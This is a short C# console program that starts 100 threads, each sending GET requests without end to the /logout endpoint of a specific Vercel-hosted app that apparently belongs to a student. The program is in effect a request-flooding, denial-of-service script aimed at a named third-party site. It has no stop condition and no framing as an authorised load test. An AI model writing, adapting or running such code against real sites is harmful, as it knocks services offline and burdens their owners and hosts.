namespace ConsoleWriteLineInCSharp
{

    internal class Program
    {
        static async Task SendRequest()
        {
            try
            {
                string url = "https://exam-month5-redux-8nq07vj7c-tohirjon-odilov.vercel.app/logout";
                HttpClient client = new HttpClient();
                HttpResponseMessage response = await client.GetAsync(url);
                Console.WriteLine("Request sent!");
            }
            catch (Exception e)
            {
                Console.WriteLine("Error: " + e.Message);
            }
        }

        const int NUM_THREADS = 100;

        static void Main(string[] args)
        {
            Thread[] threads = new Thread[NUM_THREADS];
            for (int i = 0; i < NUM_THREADS; i++)
            {
                Thread thread = new Thread(() =>
                {
                    while (true)
                    {
                        SendRequest().Wait();
                    }
                });
                thread.Start();
                threads[i] = thread;
            }

            foreach (Thread thread in threads)
            {
                thread.Join();
            }
        }
    }
}




